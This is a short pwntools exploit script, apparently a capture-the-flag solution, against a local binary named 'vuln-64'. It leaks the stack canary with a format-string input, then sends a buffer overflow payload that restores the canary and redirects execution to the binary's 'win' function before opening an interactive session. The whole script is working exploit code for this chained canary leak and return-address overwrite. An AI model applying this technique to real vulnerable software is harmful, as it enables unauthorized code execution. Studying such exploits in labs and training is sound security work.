from pwn import *


elf = context.binary = ELF("./vuln-64")



canary_idx = 15

p = process()
p.recvline()
p.sendline(f"%{canary_idx}$p")
canary =  int(p.recvline().decode().strip()[2:],16)


cannary_offset = 72


payload = flat([
    b"A" * 72,
    canary,
    b"A" * (80 - 72),
    elf.sym["win"] 
])

p.sendline(payload)
p.interactive()

print(hex(canary))